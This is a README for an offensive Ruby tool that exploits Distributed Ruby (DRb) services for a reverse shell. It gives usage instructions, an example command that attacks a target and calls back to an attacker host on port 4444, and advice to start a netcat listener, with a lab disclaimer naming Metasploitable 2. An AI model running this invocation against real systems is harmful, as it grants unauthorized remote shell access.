# drbpwn

## Description
This Ruby script provides a workaround for exploiting Distributed Ruby (DRb) vulnerabilities using instance_eval and syscall methods. It aims to serve as an alternative to the missing Metasploit module for DRb exploitation. While the Metasploit module might reappear in future versions, this script can be utilized in the meantime when other exploits are not readily available.

## Usage
To use the script, follow the syntax below:

```ruby drbpwn.rb <target_host> <target_port> <attacker_host> [<attacker_port>]```

### Arguments
- `<target_host>`: The hostname or IP address of the target machine.
- `<target_port>`: The port number on which the DRb service is running on the target machine.
- `<attacker_host>`: The hostname or IP address of the attacker machine.
- `[<attacker_port>]`: (Optional) The port number on which attacker is listening. Defaults to `4444` if not provided.

- Note: Before running this script, make sure the attacker machine is listening for incoming connections on the designated port using netcat (nc) or Metasploit's multi/handler.

## Example
```ruby drbpwn.rb 192.168.0.100 8787 192.168.0.107```


In this example, the script will attempt to exploit the DRb service running on `192.168.0.100` at port `8787` and connect back to attacker at 192.168.0.107 at port 4444

## Note
Ensure that you have proper authorization before attempting to exploit any system. This script is provided for educational purposes and should only be used in environments where you have explicit permission to do so. Also, this script can be used to exploit the vulnerable service running on the Metasploitable 2 VM on port 8787.
